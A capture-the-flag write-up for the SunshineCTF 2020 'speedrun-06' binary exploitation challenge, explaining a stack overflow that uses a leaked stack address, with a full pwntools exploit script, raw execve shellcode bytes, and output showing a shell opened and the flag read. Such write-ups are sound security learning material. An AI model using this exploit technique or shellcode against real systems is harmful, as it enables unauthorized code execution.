# speedrun-06

## Task

nc chal.2020.sunshinectf.org 30006

File: chall_06

Tags: binary exploitation

## Solution

This is basically `speedrun-03` but with the `rsp` of `main` leaked, so we need do to some calculation. It's not that hard if you know how the stack looks like.

When a new stack frame is created we save the return address and the old rbp to restore it later. This is 2 * 8 bytes or `0x10`. We are going to overwrite the whole stack until we reach the variable that's loaded into `rdx` for the `call` instruction. We will set that to `leaked_addr - 0x10` and write our shellcode directly after that. We also no longer have an unlimited write since `fgets` with size `0x100` is used instead of `gets`.

The length of our payload is 93, 56 (stack until rbp-0x8) + 8 (return address) + 29 (shellcode). Theoretically there would be enough space for some NOPs but it also works without them.

```python
from pwn import *
#p = process("./chall_06")
p = remote("chal.2020.sunshinectf.org", 30006)

info(p.recvuntil("Letting my armor fall again: "))
addr = p.recv()
info(addr)  
p.sendline()

addr_real = int(addr, 16)

payload  = "A" * 56
payload += p64(addr_real - 0x10)
payload += b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

p.sendline(payload)
p.interactive()
```

And we get our flag:

```bash
$ python2 pwny.py
[+] Opening connection to chal.2020.sunshinectf.org on port 30006: Done
[*] Letting my armor fall again:
[*] 0x7ffe7e6738e0
[*] Switching to interactive mode
For saving me from all they've taken.
$ ls
chall_06
flag.txt
$ cat flag.txt
sun{shepherd-of-fire-1a78a8e600bf4492}
```
